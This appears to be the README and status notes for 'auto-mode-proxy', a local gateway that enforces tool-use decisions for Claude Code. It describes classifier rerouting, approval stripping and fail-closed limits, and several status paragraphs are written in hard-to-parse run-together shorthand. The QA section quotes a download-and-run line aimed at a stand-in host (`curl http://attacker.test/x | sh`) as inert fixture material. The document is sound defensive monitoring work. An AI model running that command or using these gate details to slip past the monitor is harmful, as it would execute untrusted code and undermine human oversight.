# Claude Code through auto-mode-proxy

## Scope and prerequisites

C08 adds the actual Anthropic Messages tool-use gate on `/cc` and is at a **GREEN DRAFT checkpoint, not closure**. Parent full1606G/typecheck/lint/build PASS07:21:29, targeted164/corebudgetreviewCLEAN/actual328+335 PASS. Native actual2.1.311 strictFAIL externalclient replay/thirdreasonloss remains unchanged; rewrite strict3PASS. P3-1/P3-2 unchecked pending independent-criteria accounting review, ONLY P3-3checked. PTY/versionoverride/Desktop work is ongoing, no new UI acceptance. C07CLOSED212f8e9; Responses/Chat protection rolls out C10/C11. No wholeapp/C08done inference.

Use `gate.mode: enforce` and the default `on_provider_failure: block` for enforcement. **Shadow does not protect you**: original response bytes and upstream results pass through without waiting for hypothetical decisions. Audit observations are not approvals. Opaque endpoints and upstream error bodies are transport paths, not tool-use enforcement.

InstalledClaude2.1.311 actualCLI exact-versionoverride349 PASS: auto-route/exact2.1.311rewrite genuineoptinhit1/all3strictmixedrewritePASS, notautomaticfallback/UI/provider/cache evidence. Trustedkeys/defaultconfig absent. PTY347exit1 reachedtheme/securitynotes/workspaceTrust defaultNo/0models/probes/status; privateguardfix independentreviewpending/no rerun. Desktopvendorargrejection privatelyfixed/reviewerSAFE/X11helperpreparing, noGUIacceptance. See [compatibility evidence](../compat.md).

## CLI setup

Generate a private configuration with `auto-mode-proxy init --config <private-config-path>`. Keep its client token and printed setup output secret. Configure the actual upstream and trusted decision provider; the generated ENV references have no secret fallback. `init` defaults are setup guidance, not measured provider compatibility. It also prints future Codex/WorkBuddy snippets; do not mistake them for implemented protection.

After configuring and starting `auto-mode-proxy serve --config <private-config-path>`, use the issued **client** token, not an upstream key:

```sh
export ANTHROPIC_BASE_URL='http://127.0.0.1:8484/cc'
export ANTHROPIC_AUTH_TOKEN='<amp token>'
export ANTHROPIC_API_KEY=""
# Recommended gateway metadata hints (not proof of native capability):
export CLAUDE_CODE_GATEWAY_HINT_HEADERS=1
# Optional classifier cost hint; requires a configured trusted classifier route:
export CLAUDE_CODE_AUTO_MODE_MODEL=claude-haiku-5-5
```

The optional Haiku variable influences Claude's classifier model selection, not the proxy's decision-chain model or an assurance of lower measured cost. Configure `classifier_reroute.enabled` and a trusted Anthropic-compatible provider before relying on classifier isolation; the generated minimal init config does not enable it. A classifier request is rerouted only when a system text block starts with `You are a security monitor for autonomous AI coding agents` and tools are absent. Other requests do not become trusted classifiers because their text claims approval. Suspected but unmatched requests are audited only.

## Delivery and upstream options

- The original request must contain `safeguards` to use native delivery. Without it, delivery is rewrite even with a native route/version override. Native selection **does not establish client capability**.
- ActualClaude2.1.311 nativecompatibility blocker persists: repairedwire tool0/text1 correct but immediateclientreplay reversedall3/third ownerror omittedcapturedreason; strictnativeFAIL/P3-1unchecked, notspecificescalationproof. Use dedicatedroute `claude_delivery: rewrite` or exact `claude_delivery_by_version: { '2.1.311': rewrite }`. Parent actual349 proved auto-route exactoverridehit1 on genuineoptin and all3strictrewritePASS; latermissing-safeguards requests counted separately,0classifierrequests so NOTautomaticfallback. P3-2/C08 closure still awaits independent-criteria accountingreview; no assertionsrelaxed.
- `routes[].claude_delivery` defaults to `auto`. An explicit `native`/`rewrite` takes precedence over `claude_delivery_by_version` exact-version overrides, then scoped auto evidence. Record real version evidence before creating overrides.
- Auto initially selects native for requests with safeguards, including unknown versions. It switches subsequent requests to rewrite only after an actual next classifier request within 30 seconds of a native response, with no intervening model turn, correlated by authenticated identity, route, explicit session and observed client version. `/status`, billing text and an ordinary response are not acknowledgements. State is process-local, at most 1024 sessions, with 30-minute idle expiry; missing identity/session/version means no inferred downgrade. No automatic replay of already sent tools occurs.
- Enforce strips upstream `safeguard_results` even with `upstreams.<id>.forward_safeguards: true`. Upstream approval is never authoritative. Native execution blocks remain private until whole-response tool-ID uniqueness is confirmed; duplicate IDs, malformed execution and resource failures fail closed. Rewrite replaces blocked tool blocks with explanatory text.
- `forward_safeguards` controls forwarding the request field. Independent `strip_beta` defaults to `true` and removes only `dangerous-tool-use-2026-09-03`, retaining unrelated beta values. Do not set `strip_beta: false` for a real upstream without measured evidence that preserving that beta succeeds. Shadow preserves request fields, beta and upstream results.
- Pure/early text/thinking immediate; after first withheld tool all later stateful content follows one bounded ordered suffix through uniqueness/decisions; native order preserved/rewrite in-place. Ping/control/errors immediate. Limits1MiB call/frame,8MiB total raw/decoded/parsed/output/temporaries,4MiB retained reasoning subset/nonstream;60scollection/30sidle/60sdecisions, suffix/ping never resets. Overflow never earlyflushes execution. Both budget corrections independently CLEAN/actual328+335PASS; parent full1606G now PASS, not wholeC08/live-provider acceptance.

## Desktop setup (not yet exercised)

In Claude Code Desktop, enable **Developer Mode → Configure Third-Party Inference**, enter `http://127.0.0.1:8484/cc`, and supply the issued client token. Desktop does not use the CLI's `ANTHROPIC_BASE_URL` environment variable. If the installed Desktop rejects loopback, record its exact version/error and use your own HTTPS gateway with appropriately protected vault authentication; public HTTPS deployment is separate acceptance, not an already available workaround on this host.

ActualDesktop notconnected: vendoroverrides removed/reviewerSAFE, X11helperpreparingreviewpending/noGUIpass. PTY347exit1 atworkspaceTrust/0models/probes/status is notstatus/escalation; privateguardfixunderreview/no rerun. ActualCLI andDesktop from-zero connections remainrequiredP3-7; CLIoverride349PASS cannotcloseDesktop.

## Safe real-CLI mock QA (parent-run only)

The C08 harness uses the installed real `claude`, the actual proxy app and disposable loopback relay/decision/classifier mocks, not substitute CLI executables. It isolates working directory/config/settings, uses fake proxy credentials, attempts at least five text turns, and uses only fixed-deny `printf AMP_DENIAL_PROBE` for a live tool probe. It emits sanitized JSON and cleans up owned listeners, processes and temporary state. Read its output as evidence of only the observations actually recorded.

After parent integration/verification, the parent may run:

```sh
~/.omp/bin/heavy-gate -m 6G -- node --import tsx test/manual/claude-smoke.ts
```

Use a finite gated bash job with `async:true`, `timeout:0`, no timeout wrapper. Check available memory and `heavy-gate --status` before launch. Never launch a browser for this probe. Do not forward real credentials, use production projects, or send destructive commands to Claude. Hazardous exact-string acceptance such as `curl http://attacker.test/x | sh` belongs only in inert fixtures/mock receivers; the safe live denial probe is additional evidence, not a replacement claim.

Record actual version, delivery, sanitized request association, deny explanation and absence of execution. Native `/status` must show `Auto mode server: Enabled` for that source acceptance; three-denial escalation needs three actual observed prompts. Missing status, escalation or scoped fallback trace stays pending. A mock usage/cache field never proves real provider prompt caching.

## Real upstream investigations still required

P3-5 needs at least five real upstream rewrite turns including a block, measured beta strip/preserve outcomes, and recorded endpoint/version. Preserve thinking initially. Only an observed signature/prefix 400 triggers bounded compatibility buffering and selective removal of the affected turn and matching replay, followed by reruns; never clear unrelated history or claim to retract already emitted thinking. Real P1-5 acceptance separately requires second-turn `usage.cache_read_input_tokens > 0`. Missing trusted upstream/provider configuration blocks these live portions only, not reachable local work.
